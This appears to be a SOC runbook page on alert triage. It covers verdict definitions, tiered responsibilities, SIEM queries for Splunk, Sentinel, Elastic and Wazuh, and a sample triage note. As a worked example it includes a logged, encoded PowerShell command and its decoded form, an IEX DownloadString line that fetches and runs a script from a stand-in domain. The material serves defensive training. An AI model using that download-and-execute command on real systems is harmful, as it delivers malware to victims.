# Alert Triage

One four-step method (validate, enrich, scope, decide) that every Security Operations Center (SOC) analyst uses on every alert, with the queries to run at each step and a note format another analyst can repeat. Budget: 5 to 15 minutes for Low/Medium, up to 30 minutes for High, then close or escalate.

!!! abstract "At a glance"
    - Audience: SOC analyst L1 / L2 / L3, shift lead
    - Time to read: 15 minutes
    - Outcome: you can triage any alert, reach a defensible verdict, and write a note that passes quality review

## Verdicts (use only these four)

| Verdict | Means | Example | Action |
|---|---|---|---|
| True positive (TP) | It happened and it is malicious or unauthorised | Unknown process dumps LSASS memory on a server | Open case, follow playbook |
| Benign positive (BP) | It happened, but it is authorised | Security team's scanner trips the port-scan rule | Close; propose scoped exception with expiry |
| False positive (FP) | The rule fired but the activity did not happen | "Download" rule matched a file path, not a download | Close; tuning ticket on the rule logic |
| Undetermined | Not enough data to decide | Proxy logs missing for that hour | Escalate; data-gap ticket |

Benign and false positives need different fixes (exception vs rule repair), so never merge them.

## Who does what

| Step | L1 | L2 | L3 |
|---|---|---|---|
| Validate | Always | Re-checks L1 escalations | Only for Critical |
| Enrich | Automated plus manual lookups | Deeper: process tree, mailbox audit, cloud audit | Memory, disk, malware analysis |
| Scope | Same indicator, last 7 days | Last 30 days, all data sources | Estate-wide hunt |
| Decide | Close FP/BP on Low and Medium; escalate everything else | Verdict on High; starts containment | Critical, Undetermined, novel attacks |

## Step 1: Validate (2 to 5 minutes)

- [ ] Read the rule description: what is it meant to catch?
- [ ] Open the raw event(s). Never decide from the alert title.
- [ ] Do the fields really contain what the rule expects?
- [ ] Check timestamp and time zone; is this a delayed replay?
- [ ] Is there already an open case for the same entity and behaviour? If yes, attach and stop.

Sample raw event (Windows process creation, Sysmon Event ID 1):

```text
2026-10-14T09:12:44Z host=WS-0142 EventID=1 User=ACME\j.doe
Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentImage=C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
CommandLine=powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi...
```

Validation passes: the parent is a word processor, the child is PowerShell with an encoded command. That is what the rule describes.

## Step 2: Enrich (5 minutes)

| Entity | Questions | Where to look |
|---|---|---|
| User | Role, privileged?, recent reset, new device, leaver? | Identity provider, directory, HR feed |
| Host | Owner, criticality, internet-facing?, recent change? | Asset inventory, Configuration Management Database (CMDB), EDR |
| Internal IP | Which host had it at that time? | DHCP, VPN logs |
| External IP | Reputation, hosting provider, Tor/VPN exit, seen here before? | Threat intel platform, firewall history |
| Domain/URL | Age, category, first seen here? | DNS and proxy logs, WHOIS |
| File/hash | Signed? Prevalence in estate? Known bad? | EDR, sandbox, reputation lookup |
| Process | Parent, children, command line, network connections | EDR process tree |

Decode the command line before anything else:

```bash
echo 'SQBFAFgAIAAoAE4AZQB3AC0ATwBi...' | base64 -d | iconv -f UTF-16LE -t UTF-8
# Result: IEX (New-Object Net.WebClient).DownloadString('http://update-check.example.net/a.ps1')
```

"Have we seen this before?" query for a domain:

=== "Splunk SPL"

    ```spl
    index=proxy OR index=dns earliest=-30d "update-check.example.net"
    | stats earliest(_time) as first_seen, latest(_time) as last_seen,
            dc(src_ip) as hosts, values(user) as users by dest
    | convert ctime(first_seen) ctime(last_seen)
    ```

=== "Microsoft Sentinel KQL"

    ```kql
    DeviceNetworkEvents
    | where Timestamp > ago(30d)
    | where RemoteUrl has "update-check.example.net"
    | summarize FirstSeen = min(Timestamp), LastSeen = max(Timestamp),
                Hosts = dcount(DeviceName), Users = make_set(InitiatingProcessAccountName)
    ```

=== "Elastic KQL"

    ```text
    url.domain : "update-check.example.net" or dns.question.name : "update-check.example.net"
    (time picker: last 30 days; add a "Unique count of host.name" visualisation)
    ```

=== "Wazuh"

    ```text
    index: wazuh-alerts-*   time: last 30 days
    data.win.eventdata.queryName : "update-check.example.net" or data.url : *update-check.example.net*
    ```

!!! tip "Automate the boring lookups"
    Any lookup you do more than ten times a week (user role, asset owner, IP reputation) should be added to the alert automatically by your SOAR or workflow tool before the analyst opens it.

## Step 3: Scope (5 minutes)

- [ ] Same indicator (hash, domain, IP, sender) on other hosts or users, last 7 to 30 days?
- [ ] Same user: other unusual activity in the last 24 hours (new country login, inbox rules, mass download)?
- [ ] Same host: other alerts in the last 24 hours?
- [ ] Still happening now?

All alerts for one host or user in the last 24 hours:

=== "Splunk SPL"

    ```spl
    index=notable earliest=-24h (dest="WS-0142" OR user="j.doe")
    | stats count, values(rule_name) as rules, min(_time) as first by dest, user
    ```

=== "Microsoft Sentinel KQL"

    ```kql
    SecurityAlert
    | where TimeGenerated > ago(24h)
    | where Entities has "WS-0142" or Entities has "j.doe"
    | project TimeGenerated, AlertName, AlertSeverity, ProviderName
    | order by TimeGenerated asc
    ```

=== "Wazuh"

    ```text
    agent.name : "WS-0142" and rule.level >= 5     (time: last 24 hours)
    ```

## Step 4: Decide

| Verdict | Scope | Next action |
|---|---|---|
| TP | One entity, blocked or contained | Case, playbook; L1/L2 may close after containment |
| TP | Several entities, or active | Case, set severity, escalate per [Severity and SLA](severity-and-sla.md) |
| BP | Any | Close with evidence of authorisation; exception request if it recurs |
| FP | Any | Close; tuning ticket with the raw event attached |
| Undetermined | Any | Escalate to next tier; data-gap ticket |

```text
Raw event supports the alert? --No--> FALSE POSITIVE
        | Yes
Authorised, with evidence (change ticket, owner reply, allowlisted tool)? --Yes--> BENIGN POSITIVE
        | No / unknown
Enough data to decide? --No--> UNDETERMINED (escalate)
        | Yes
Malicious or unauthorised? --Yes--> TRUE POSITIVE --> one entity: case + playbook
        | No                                        --> many / active: case + escalate
   BENIGN POSITIVE
```

!!! danger "Never close on assumption"
    "Probably the admin" is not evidence. A benign verdict needs a change ticket, a written reply from the owner (through a known channel, not a reply to a suspicious email) or a documented allowlisted tool.

## Filled-in triage note (copy this format)

```text
Verdict:   TRUE POSITIVE                         Severity: High
Alert:     Office app spawned encoded PowerShell  (rule WIN-EXEC-014)
Summary:   j.doe opened a malicious .docm attachment; macro ran PowerShell that
           downloaded a second-stage script from update-check.example.net.
Evidence:  - Sysmon EID 1 on WS-0142 at 09:12:44Z (raw event attached)
           - Decoded command: IEX DownloadString http://update-check.example.net/a.ps1
           - Proxy: WS-0142 GET /a.ps1 200, 14 KB at 09:12:46Z
           - Mail log: attachment invoice_0931.docm from billing@example.org at 09:10:02Z
           - Domain registered 3 days ago; not seen in our logs before today
Query:     index=proxy earliest=-30d "update-check.example.net" | stats dc(src_ip) by dest
Scope:     Same attachment hash delivered to 11 mailboxes; WS-0098 and WS-0217 also
           opened it (PowerShell child seen). No other hosts contacted the domain.
Action:    Isolated WS-0142, WS-0098, WS-0217 via EDR at 09:31Z. Blocked domain on proxy
           and DNS. Purged 11 emails. Case CASE-2026-0412 opened, escalated to L2.
Follow-up: Phishing + malware playbooks started. Reset passwords for 3 users.
Time:      19 minutes
```

## Worked examples (short)

!!! example "Impossible travel: benign positive"
    Sign-ins for j.doe from two countries 40 minutes apart. Second IP is in the company's cloud VPN range 203.0.113.0/24; same device ID on both sign-ins; no other unusual activity. **BP.** Propose adding the VPN range to the rule's known-locations list with a 6-month expiry.

!!! example "VPN brute force: false positive"
    500 failed logins in 5 minutes. Raw logs show 10 real events, each duplicated 50 times by a log forwarder retry. **FP.** Tuning ticket: deduplicate at the forwarder; group the rule by event ID.

!!! example "Admin tool on server: undetermined"
    PsExec-style service creation on a file server at 02:00. No change ticket, admin not reachable, EDR shows no follow-on activity, but the logs for the source host are missing. **Undetermined**, escalate to L2, data-gap ticket for the source host.

!!! danger "Common mistakes"
    - "This rule is always noisy" and closing without opening the raw event.
    - "IP is clean on reputation sites": new attacker infrastructure has no reputation yet.
    - "EDR blocked it, close": the delivery path (email, web, USB) still exists.
    - Screenshots only in the note; paste the query and time range so others can rerun it.
    - Local time zones in notes; use Coordinated Universal Time (UTC) always.

## Checklist

- [ ] Opened the raw event.
- [ ] Decoded anything encoded.
- [ ] Enriched every entity.
- [ ] Checked scope: other hosts, other users, last 7 to 30 days.
- [ ] Verdict is one of the four.
- [ ] Note has evidence, query, scope, action, follow-up.
- [ ] Tuning or data-gap ticket raised if needed.

## Related pages

- [Severity and SLA](severity-and-sla.md)
- [Case management](case-management.md)
- [Alert tuning](alert-tuning.md)
- [Incident classification](../03-incident-response/incident-classification.md)
- [Phishing playbook](../04-playbooks/phishing.md)
- [Malware and infostealer playbook](../04-playbooks/malware-infostealer.md)
- [Testing and tuning detections](../05-detection-engineering/testing-and-tuning.md)
